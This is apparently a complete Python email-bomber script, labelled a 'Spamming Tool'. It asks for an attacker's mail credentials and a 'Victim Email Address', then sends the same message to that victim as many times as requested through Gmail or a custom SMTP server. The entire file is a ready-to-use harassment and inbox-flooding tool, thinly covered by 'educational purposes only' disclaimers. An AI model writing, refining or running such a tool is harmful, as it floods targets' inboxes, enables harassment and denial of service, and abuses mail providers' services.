#!/usr/bin/python3
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!
# Python 3 rewrite by Omicron166

from os import urandom
import smtplib
from getpass import getpass
import sys
from time import sleep

print('                                                                    ')
print('                                                                    ')
print('            #################################################       ')
print('            #                                               #       ')
print('            #        Email Bomber ( Spamming Tool )         #       ')
print('            #                                               #       ')
print('            #                  Version 3.0                  #       ')
print('            #                                               #       ')
print('            #           Modified by : Mohin Paramasivam     #       ')
print('            #                                               #       ')
print('            #       Only for Educational Purposes !!        #       ')
print('            #                                               #       ')
print('            #################################################       ')
print('\n\n')

user = input('Anonymous name: ')
email = input('\nAttacker Email Address: ')
passwd = getpass('\nAttacker Email Password: ')
to = input('\nVictim Email Address: ')
total = input('\nNumber of emails: ')
body = input('\nMessage: ')
Cserver = input('\nCustom smtp server (leave blank to use gmail): ')

if not Cserver == '':
    defaultconf = False
    smtp_server = Cserver
    Cport = input('Custom smtp port (leave blank to use defaul port): ')
    if not Cport == '':
        port = int(Cport)
    else:
        port = 587
else:
    smtp_server = 'smtp.gmail.com'
    port = 587
    defaultconf = True


try:
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(email, passwd)
    for i in range(1, int(total) + 1):
        subject = urandom(9)
        msg = 'From: ' + user + '\nMessage: ' + '\n' + body
        server.sendmail(email, to, msg)
        print("\rE-mails sent: %i" % i)
        sleep(1)
        sys.stdout.flush()
    server.quit()
    print('\n Done !!!')
    sys.exit()
except KeyboardInterrupt:
    print('[-] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print('[!] The username or password you entered is incorrect')
    sys.exit()
except smtplib.SMTPConnectError:
    print('\n[!] Failed to connect with the SMTP server')
    sys.exit()
